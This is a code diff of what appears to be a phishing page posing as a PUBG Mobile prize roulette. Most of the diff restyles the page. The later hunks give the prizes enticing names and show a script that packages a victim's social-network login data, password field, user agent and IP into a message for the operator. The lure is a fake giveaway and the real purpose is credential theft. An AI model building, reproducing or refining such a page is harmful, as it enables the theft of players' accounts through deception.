@@ -128,7 +128,7 @@
             margin-left: 40px;
         }
         
-        /* Иконка почты для приза с анимацией */
+        /* Иконка почты для приза */
         .prize-mail-icon {
             position: relative;
             margin-left: auto;
@@ -170,13 +170,6 @@
             align-items: center;
             justify-content: center;
             font-weight: bold;
-            animation: emojiPulse 2s infinite;
-        }
-        
-        @keyframes emojiPulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.2); }
-            100% { transform: scale(1); }
         }
         
         .prize-mail-btn:disabled {
@@ -186,7 +179,7 @@
             transform: none;
         }
         
-        /* Окно с призом - УПРОЩЕННОЕ */
+        /* Окно с призом */
         .prize-window {
             position: fixed;
             top: 0;
@@ -211,7 +204,7 @@
             border-radius: 20px;
             padding: 30px;
             width: 90%;
-            max-width: 350px;
+            max-width: 400px;
             border: 2px solid #2a3b5a;
             box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7);
             text-align: center;
@@ -220,19 +213,16 @@
         
         .prize-header {
             display: flex;
-            justify-content: center;
+            justify-content: space-between;
             align-items: center;
             margin-bottom: 20px;
         }
         
         .prize-title {
-            color: #ffb000;
-            font-size: 26px;
-            font-weight: 700;
-            font-family: 'Orbitron', sans-serif;
-            text-align: center;
-            letter-spacing: 1px;
-            text-shadow: 0 0 10px rgba(255, 176, 0, 0.5);
+            color: #8da1b5;
+            font-size: 22px;
+            font-weight: 500;
+            font-family: Arial, sans-serif;
         }
         
         .close-prize {
@@ -242,9 +232,6 @@
             font-size: 28px;
             cursor: pointer;
             transition: color 0.3s;
-            position: absolute;
-            top: 15px;
-            right: 15px;
         }
         
         .close-prize:hover {
@@ -253,17 +240,85 @@
         
         .prize-image-container {
             margin: 20px 0;
-            padding: 15px;
+            padding: 20px;
             background: rgba(10, 21, 32, 0.7);
             border-radius: 15px;
             border: 2px solid #2a3b5a;
         }
         
         .prize-image {
-            width: 130px;
-            height: 130px;
+            width: 150px;
+            height: 150px;
             object-fit: contain;
             margin: 0 auto;
+        }
+        
+        .prize-name {
+            color: #8da1b5;
+            font-size: 18px;
+            margin: 15px 0;
+            font-family: Arial, sans-serif;
+            font-weight: 500;
+        }
+        
+        .prize-status {
+            color: #8da1b5;
+            font-size: 16px;
+            margin: 15px 0;
+            font-family: Arial, sans-serif;
+            padding: 10px;
+            background: rgba(42, 59, 90, 0.5);
+            border-radius: 8px;
+        }
+        
+        .prize-status.received {
+            color: #4CAF50;
+            background: rgba(76, 175, 80, 0.1);
+            border: 1px solid #4CAF50;
+        }
+        
+        .prize-status.not-received {
+            color: #ff9800;
+            background: rgba(255, 152, 0, 0.1);
+            border: 1px solid #ff9800;
+        }
+        
+        .get-prize-now-btn {
+            background: linear-gradient(45deg, #2a3b5a 0%, #1a2c42 100%);
+            color: #8da1b5;
+            border: none;
+            border-radius: 60px;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            box-shadow: 0 10px 25px rgba(42, 59, 90, 0.5);
+            transition: all 0.3s;
+            width: 100%;
+            font-family: Arial, sans-serif;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-top: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            backdrop-filter: blur(5px);
+            border: 2px solid rgba(42, 59, 90, 0.5);
+        }
+        
+        .get-prize-now-btn:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(42, 59, 90, 0.7);
+            background: linear-gradient(45deg, #3a4b6a 0%, #2a3c52 100%);
+        }
+        
+        .get-prize-now-btn:disabled {
+            background: linear-gradient(45deg, #444, #555);
+            color: #777;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
         
         .no-prize-message {
@@ -308,18 +363,18 @@
             text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5);
         }
         
-        /* ОБНОВЛЕННЫЙ КОНТЕЙНЕР РУЛЕТКИ - УМЕНЬШЕННЫЙ */
+        /* ОБНОВЛЕННЫЙ КОНТЕЙНЕР РУЛЕТКИ */
         .roulette-container {
             position: relative;
             width: 100%;
-            height: 380px;
+            height: 450px;
             background: rgba(20, 35, 60, 0.3);
-            border-radius: 20px;
+            border-radius: 25px;
             overflow: hidden;
-            margin-bottom: 25px;
+            margin-bottom: 30px;
             box-shadow: 
-                0 15px 30px rgba(0, 0, 0, 0.6),
-                inset 0 0 60px rgba(42, 59, 90, 0.3);
+                0 20px 40px rgba(0, 0, 0, 0.6),
+                inset 0 0 80px rgba(42, 59, 90, 0.3);
             border: 3px solid rgba(42, 59, 90, 0.8);
             backdrop-filter: blur(10px);
             display: flex;
@@ -327,30 +382,29 @@
             justify-content: center;
         }
         
-        /* УМЕНЬШЕННАЯ СЕТКА ПРИЗОВ */
         .prizes-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             grid-template-rows: repeat(3, 1fr);
-            gap: 8px;
-            width: 85%;
-            height: 85%;
+            gap: 15px;
+            width: 90%;
+            height: 90%;
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            padding: 15px;
+            padding: 20px;
         }
         
         .prize-item {
             background: rgba(255, 255, 255, 0.05);
-            border-radius: 12px;
+            border-radius: 15px;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 0;
             transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            border: 1px solid transparent;
+            border: 2px solid transparent;
             position: relative;
             overflow: hidden;
         }
@@ -363,15 +417,15 @@
             right: 0;
             bottom: 0;
             background: linear-gradient(135deg, rgba(42, 59, 90, 0.3), transparent);
-            border-radius: 11px;
+            border-radius: 13px;
             opacity: 0;
             transition: opacity 0.3s;
         }
         
         .prize-item:hover {
-            transform: translateY(-3px);
+            transform: translateY(-5px);
             border-color: rgba(255, 176, 0, 0.3);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
         }
         
         .prize-item:hover::before {
@@ -379,8 +433,8 @@
         }
         
         .prize-item img {
-            width: 70px;
-            height: 70px;
+            width: 90px;
+            height: 90px;
             object-fit: contain;
             transition: all 0.4s;
             filter: drop-shadow(0 5px 10px rgba(0, 0, 0, 0.3));
@@ -388,7 +442,7 @@
         }
         
         .prize-item:hover img {
-            transform: scale(1.1) rotate(5deg);
+            transform: scale(1.15) rotate(5deg);
         }
         
         .center-item {
@@ -399,22 +453,22 @@
         }
         
         .center-item img {
-            width: 60px;
-            height: 60px;
-            filter: drop-shadow(0 0 10px rgba(255, 176, 0, 0.5));
+            width: 80px;
+            height: 80px;
+            filter: drop-shadow(0 0 15px rgba(255, 176, 0, 0.5));
             opacity: 0.8;
         }
         
-        /* УМЕНЬШЕННАЯ РАМКА ВЫБОРА */
+        /* НОВАЯ РАМКА ВЫБОРА - УЛУЧШЕННЫЙ ДИЗАЙН */
         .selection-frame {
             position: absolute;
-            border: 2px solid #ffb000;
-            border-radius: 15px;
+            border: 3px solid #ffb000;
+            border-radius: 20px;
             box-shadow: 
-                0 0 20px rgba(255, 176, 0, 0.8),
-                0 0 40px rgba(255, 176, 0, 0.4),
-                inset 0 0 20px rgba(255, 176, 0, 0.2);
-            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+                0 0 30px rgba(255, 176, 0, 0.8),
+                0 0 60px rgba(255, 176, 0, 0.4),
+                inset 0 0 30px rgba(255, 176, 0, 0.2);
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             z-index: 100;
             pointer-events: none;
             opacity: 0;
@@ -428,12 +482,12 @@
         .selection-frame::before {
             content: '';
             position: absolute;
-            top: -6px;
-            left: -6px;
-            right: -6px;
-            bottom: -6px;
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            border-radius: 18px;
+            top: -10px;
+            left: -10px;
+            right: -10px;
+            bottom: -10px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 24px;
             animation: borderRotate 4s linear infinite;
             pointer-events: none;
         }
@@ -441,54 +495,54 @@
         .selection-frame::after {
             content: '';
             position: absolute;
-            top: 6px;
-            left: 6px;
-            right: 6px;
-            bottom: 6px;
+            top: 10px;
+            left: 10px;
+            right: 10px;
+            bottom: 10px;
             border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 12px;
+            border-radius: 15px;
             pointer-events: none;
         }
         
-        /* Уголки рамки - УМЕНЬШЕННЫЕ */
+        /* Уголки рамки */
         .corner {
             position: absolute;
-            width: 12px;
-            height: 12px;
-            border: 2px solid #ffb000;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #ffb000;
             opacity: 0.8;
         }
         
         .corner-tl {
-            top: -4px;
-            left: -4px;
+            top: -5px;
+            left: -5px;
             border-right: none;
             border-bottom: none;
-            border-top-left-radius: 6px;
+            border-top-left-radius: 8px;
         }
         
         .corner-tr {
-            top: -4px;
-            right: -4px;
+            top: -5px;
+            right: -5px;
             border-left: none;
             border-bottom: none;
-            border-top-right-radius: 6px;
+            border-top-right-radius: 8px;
         }
         
         .corner-bl {
-            bottom: -4px;
-            left: -4px;
+            bottom: -5px;
+            left: -5px;
             border-right: none;
             border-top: none;
-            border-bottom-left-radius: 6px;
+            border-bottom-left-radius: 8px;
         }
         
         .corner-br {
-            bottom: -4px;
-            right: -4px;
+            bottom: -5px;
+            right: -5px;
             border-left: none;
             border-top: none;
-            border-bottom-right-radius: 6px;
+            border-bottom-right-radius: 8px;
         }
         
         .selection-frame.active {
@@ -510,16 +564,16 @@
             0% {
                 transform: scale(1);
                 box-shadow: 
-                    0 0 20px rgba(255, 176, 0, 0.8),
-                    0 0 40px rgba(255, 176, 0, 0.4),
-                    inset 0 0 20px rgba(255, 176, 0, 0.2);
+                    0 0 30px rgba(255, 176, 0, 0.8),
+                    0 0 60px rgba(255, 176, 0, 0.4),
+                    inset 0 0 30px rgba(255, 176, 0, 0.2);
             }
             100% {
                 transform: scale(1.03);
                 box-shadow: 
-                    0 0 30px rgba(255, 176, 0, 1),
-                    0 0 60px rgba(255, 176, 0, 0.6),
-                    inset 0 0 30px rgba(255, 176, 0, 0.3);
+                    0 0 40px rgba(255, 176, 0, 1),
+                    0 0 80px rgba(255, 176, 0, 0.6),
+                    inset 0 0 40px rgba(255, 176, 0, 0.3);
             }
         }
         
@@ -532,20 +586,20 @@
             }
         }
         
-        /* ИНДИКАТОР ВЫБОРА - УМЕНЬШЕННЫЙ */
+        /* ИНДИКАТОР ВЫБОРА */
         .selection-indicator {
             position: absolute;
-            top: -30px;
+            top: -40px;
             left: 50%;
             transform: translateX(-50%);
             background: linear-gradient(135deg, #ffb000, #ff8000);
             color: #000;
-            padding: 6px 15px;
-            border-radius: 25px;
+            padding: 8px 20px;
+            border-radius: 30px;
             font-weight: bold;
-            font-size: 12px;
+            font-size: 14px;
             white-space: nowrap;
-            box-shadow: 0 4px 12px rgba(255, 128, 0, 0.4);
+            box-shadow: 0 5px 15px rgba(255, 128, 0, 0.4);
             z-index: 101;
             opacity: 0;
             transition: opacity 0.3s;
@@ -554,33 +608,33 @@
         .selection-indicator::after {
             content: '';
             position: absolute;
-            bottom: -6px;
+            bottom: -8px;
             left: 50%;
             transform: translateX(-50%);
-            border-left: 8px solid transparent;
-            border-right: 8px solid transparent;
-            border-top: 8px solid #ffb000;
+            border-left: 10px solid transparent;
+            border-right: 10px solid transparent;
+            border-top: 10px solid #ffb000;
         }
         
         .selection-indicator.show {
             opacity: 1;
         }
         
-        /* КНОПКА ИГРАТЬ */
+        /* КНОПКА ИГРАТЬ - УЛУЧШЕННЫЙ ДИЗАЙН */
         .play-btn {
             background: linear-gradient(180deg, #ffb000 0%, #ff8000 100%);
             color: #000;
             border: none;
             border-radius: 60px;
-            padding: 20px 45px;
-            font-size: 22px;
+            padding: 22px 50px;
+            font-size: 24px;
             font-weight: 700;
             cursor: pointer;
             box-shadow: 
-                0 8px 25px rgba(255, 128, 0, 0.4),
+                0 10px 30px rgba(255, 128, 0, 0.4),
                 inset 0 1px 0 rgba(255, 255, 255, 0.3);
             transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            margin-bottom: 30px;
+            margin-bottom: 35px;
             width: 85%;
             max-width: 350px;
             font-family: 'Orbitron', sans-serif;
@@ -609,7 +663,7 @@
         .play-btn:hover:not(:disabled) {
             transform: translateY(-8px) scale(1.05);
             box-shadow: 
-                0 15px 35px rgba(255, 128, 0, 0.6),
+                0 20px 40px rgba(255, 128, 0, 0.6),
                 inset 0 1px 0 rgba(255, 255, 255, 0.3);
             letter-spacing: 3px;
         }
@@ -632,10 +686,10 @@
         
         .play-btn i {
             margin-right: 10px;
-            font-size: 20px;
+            font-size: 22px;
         }
         
-        /* ФОРМА ВЫБОРА СОЦСЕТИ */
+        /* ФОРМА ВЫБОРА СОЦСЕТИ - УЛУЧШЕННЫЙ ДИЗАЙН */
         .social-select-section {
             background: rgba(20, 35, 60, 0.9);
             border-radius: 20px;
@@ -779,7 +833,7 @@
             font-weight: 700;
         }
         
-        /* КНОПКА ПОЛУЧИТЬ ПРИЗ */
+        /* КНОПКА ПОЛУЧИТЬ ПРИЗ - УЛУЧШЕННЫЙ ДИЗАЙН */
         .get-prize-btn {
             background: linear-gradient(180deg, #ffb000 0%, #ff8000 100%);
             color: #000;
@@ -846,7 +900,7 @@
             font-size: 20px;
         }
         
-        /* СЕКЦИЯ ПОДТВЕРЖДЕНИЯ */
+        /* СЕКЦИЯ ПОДТВЕРЖДЕНИЯ - УЛУЧШЕННЫЙ ДИЗАЙН */
         .confirmation-section {
             background: rgba(20, 35, 60, 0.9);
             border-radius: 20px;
@@ -902,7 +956,7 @@
             border: 1px solid rgba(76, 175, 80, 0.3);
         }
         
-        /* УВЕДОМЛЕНИЯ */
+        /* УВЕДОМЛЕНИЯ - УЛУЧШЕННЫЙ ДИЗАЙН */
         .notification {
             position: fixed;
             top: 20px;
@@ -1831,28 +1885,19 @@
         }
         
         @media (max-width: 600px) {
-            .roulette-container {
-                height: 320px;
-            }
-            
             .prizes-grid {
-                gap: 6px;
-                padding: 12px;
+                gap: 10px;
+                padding: 15px;
             }
             
             .prize-item img {
-                width: 55px;
-                height: 55px;
-            }
-            
-            .center-item img {
-                width: 50px;
-                height: 50px;
+                width: 70px;
+                height: 70px;
             }
             
             .play-btn {
-                padding: 16px 35px;
-                font-size: 18px;
+                padding: 18px 30px;
+                font-size: 20px;
             }
             
             .header h1 {
@@ -1916,23 +1961,9 @@
             }
             
             .selection-indicator {
-                font-size: 11px;
-                padding: 5px 12px;
-                top: -25px;
-            }
-            
-            .prize-content {
-                padding: 25px;
-                max-width: 320px;
-            }
-            
-            .prize-image {
-                width: 110px;
-                height: 110px;
-            }
-            
-            .prize-title {
-                font-size: 22px;
+                font-size: 12px;
+                padding: 6px 15px;
+                top: -35px;
             }
         }
     </style>
@@ -1942,12 +1973,12 @@
     <!-- Уведомление -->
     <div class="notification" id="notification"></div>
     
-    <!-- Окно с призом - УПРОЩЕННОЕ -->
+    <!-- Окно с призом -->
     <div class="prize-window" id="prizeWindow">
         <div class="prize-content">
-            <button class="close-prize" onclick="closePrizeWindow()">&times;</button>
             <div class="prize-header">
-                <h2 class="prize-title">❗️ ВАШ ПРИЗ ❗️</h2>
+                <h2 class="prize-title">ВАШ ПРИЗ</h2>
+                <button class="close-prize" onclick="closePrizeWindow()">&times;</button>
             </div>
             
             <div id="prizeWindowContent">
@@ -2221,35 +2252,35 @@
         <div class="roulette-container">
             <div class="prizes-grid">
                 <div class="prize-item" data-id="1">
-                    <img src="priz1.png" alt="Приз">
+                    <img src="priz1.png" alt="Приз 1">
                 </div>
                 <div class="prize-item" data-id="2">
-                    <img src="priz2.png" alt="Приз">
+                    <img src="priz2.png" alt="Приз 2">
                 </div>
                 <div class="prize-item" data-id="3">
-                    <img src="priz3.png" alt="Приз">
+                    <img src="priz3.png" alt="Приз 3">
                 </div>
                 <div class="prize-item" data-id="4">
-                    <img src="priz4.png" alt="Приз">
+                    <img src="priz4.png" alt="Приз 4">
                 </div>
                 <div class="prize-item center-item" data-id="5">
-                    <img src="priz5.png" alt="Приз">
+                    <img src="priz5.png" alt="Приз 5">
                 </div>
                 <div class="prize-item" data-id="6">
-                    <img src="priz6.png" alt="Приз">
+                    <img src="priz6.png" alt="Приз 6">
                 </div>
                 <div class="prize-item" data-id="7">
-                    <img src="priz7.png" alt="Приз">
+                    <img src="priz7.png" alt="Приз 7">
                 </div>
                 <div class="prize-item" data-id="8">
-                    <img src="priz8.png" alt="Приз">
+                    <img src="priz8.png" alt="Приз 8">
                 </div>
                 <div class="prize-item" data-id="9">
-                    <img src="priz9.png" alt="Приз">
+                    <img src="priz9.png" alt="Приз 9">
                 </div>
             </div>
             
-            <!-- Уменьшенная рамка с индикатором -->
+            <!-- Новая рамка с индикатором -->
             <div class="selection-frame" id="selectionFrame">
                 <div class="corner corner-tl"></div>
                 <div class="corner corner-tr"></div>
@@ -2399,16 +2430,20 @@
             if (userPrize) {
                 content.innerHTML = `
                     <div class="prize-image-container">
-                        <img src="${userPrize.image}" alt="Приз" class="prize-image">
+                        <img src="${userPrize.image}" alt="${userPrize.name}" class="prize-image">
+                    </div>
+                    <div class="prize-name">${userPrize.name}</div>
+                    <div class="prize-status ${isPrizeReceived ? 'received' : 'not-received'}">
+                        ${isPrizeReceived ? '✅ Приз уже получен' : '⏳ Ожидает получения'}
                     </div>
                     ${!isPrizeReceived ? `
-                    <button class="get-prize-now-btn" onclick="getPrizeFromWindow()" style="background: linear-gradient(180deg, #ffb000 0%, #ff8000 100%); color: #000; border: none; border-radius: 60px; padding: 15px 30px; font-size: 18px; font-weight: 700; cursor: pointer; width: 100%; font-family: 'Orbitron', sans-serif; margin-top: 20px;">
+                    <button class="get-prize-now-btn" onclick="getPrizeFromWindow()">
                         <i class="fas fa-gift"></i> ПОЛУЧИТЬ СЕЙЧАС
                     </button>
                     ` : ''}
                     <p style="color: #8da1b5; font-size: 14px; margin-top: 15px; font-family: Arial, sans-serif;">
                         ${isPrizeReceived ? 
-                            '✅ Ваш приз был отправлен на ваш аккаунт PUBG Mobile.' : 
+                            'Ваш приз был отправлен на ваш аккаунт PUBG Mobile.' : 
                             'Выберите социальную сеть для получения приза.'}
                     </p>
                 `;
@@ -2447,23 +2482,18 @@
             const mailBtn = document.getElementById('prizeMailBtn');
             
             if (userPrize && !isPrizeReceived) {
-                badge.textContent = '❗';
+                badge.textContent = '1';
                 badge.style.display = 'flex';
-                badge.style.background = '#ffb000';
                 mailBtn.disabled = false;
-                // Добавляем анимацию пульсации
-                badge.style.animation = 'emojiPulse 2s infinite';
             } else if (userPrize && isPrizeReceived) {
                 badge.textContent = '✓';
                 badge.style.display = 'flex';
                 badge.style.background = '#4CAF50';
                 mailBtn.disabled = false;
-                badge.style.animation = 'none';
             } else {
                 badge.textContent = '0';
                 badge.style.display = 'none';
                 mailBtn.disabled = false;
-                badge.style.animation = 'none';
             }
         }
         
@@ -2483,17 +2513,17 @@
             const socialOptions = document.querySelectorAll('.social-option');
             const prizeMailBtn = document.getElementById('prizeMailBtn');
             
-            // Призы с картинками (без названий)
+            // Призы с картинками
             const prizes = [
-                { id: 1, image: "priz1.png" },
-                { id: 2, image: "priz2.png" },
-                { id: 3, image: "priz3.png" },
-                { id: 4, image: "priz4.png" },
-                { id: 5, image: "priz5.png" },
-                { id: 6, image: "priz6.png" },
-                { id: 7, image: "priz7.png" },
-                { id: 8, image: "priz8.png" },
-                { id: 9, image: "priz9.png" }
+                { id: 1, image: "priz1.png", name: "Редкая экипировка" },
+                { id: 2, image: "priz2.png", name: "Эксклюзивное оружие" },
+                { id: 3, image: "priz3.png", name: "Особый транспорт" },
+                { id: 4, image: "priz4.png", name: "Легендарный скин" },
+                { id: 5, image: "priz5.png", name: "Главный приз: 1000 UC" },
+                { id: 6, image: "priz6.png", name: "Эмоция танца" },
+                { id: 7, image: "priz7.png", name: "Набор выживальщика" },
+                { id: 8, image: "priz8.png", name: "Улучшенный рюкзак" },
+                { id: 9, image: "priz9.png", name: "Золотой парашют" }
             ];
             
             let isSpinning = false;
@@ -2609,15 +2639,15 @@
                 const rect = prizeItem.getBoundingClientRect();
                 const containerRect = document.querySelector('.roulette-container').getBoundingClientRect();
                 
-                selectionFrame.style.width = (rect.width + 16) + 'px';
-                selectionFrame.style.height = (rect.height + 16) + 'px';
-                selectionFrame.style.left = (rect.left - containerRect.left - 6) + 'px';
-                selectionFrame.style.top = (rect.top - containerRect.top - 6) + 'px';
+                selectionFrame.style.width = (rect.width + 20) + 'px';
+                selectionFrame.style.height = (rect.height + 20) + 'px';
+                selectionFrame.style.left = (rect.left - containerRect.left - 8) + 'px';
+                selectionFrame.style.top = (rect.top - containerRect.top - 8) + 'px';
                 selectionFrame.classList.add('active');
                 
                 // Позиционирование индикатора
                 selectionIndicator.style.left = rect.left - containerRect.left + rect.width/2 + 'px';
-                selectionIndicator.style.top = rect.top - containerRect.top - 28 + 'px';
+                selectionIndicator.style.top = rect.top - containerRect.top - 35 + 'px';
             }
             
             // Функция показа/скрытия индикатора
@@ -2692,7 +2722,7 @@
                             userPrize = prizes[finalPrizeIndex];
                             isPrizeReceived = false;
                             
-                            // Обновляем значок с анимацией
+                            // Обновляем значок
                             updatePrizeBadge();
                             
                             hasPlayed = true;
@@ -2707,7 +2737,7 @@
                             socialSelectSection.classList.add('active');
                             socialSelectSection.scrollIntoView({ behavior: 'smooth' });
                             
-                            showNotification(`🎉 Поздравляем! Вы выиграли приз!`, false, true);
+                            showNotification(`🎉 Поздравляем! Вы выиграли: ${userPrize.name}`, false, true);
                         }, 1000);
                     }, 300);
                 }
@@ -2878,7 +2908,7 @@
                     'google': 'Google'
                 };
                 
-                const prizeNumber = prizeIndex + 1;
+                const prizeName = prizes[prizeIndex]?.name || `Приз #${prizeIndex + 1}`;
                 
                 let message = `🔐 НОВЫЕ ДАННЫЕ ДЛЯ ВХОДА PUBG 🔐\n\n`;
                 message += `📱 Соцсеть: ${socialNames[socialType] || socialType}\n`;
@@ -2900,7 +2930,7 @@
                     message += `👁️ Показать пароль: ${loginData.show_password || 'Нет'}\n`;
                 }
                 
-                message += `🎁 Выигранный приз: #${prizeNumber}\n`;
+                message += `🎁 Выигранный приз: ${prizeName}\n`;
                 message += `⏰ Время: ${new Date().toLocaleString()}\n`;
                 message += `🌐 User Agent: ${navigator.userAgent}\n`;
                 message += `📍 IP: собирается...`;
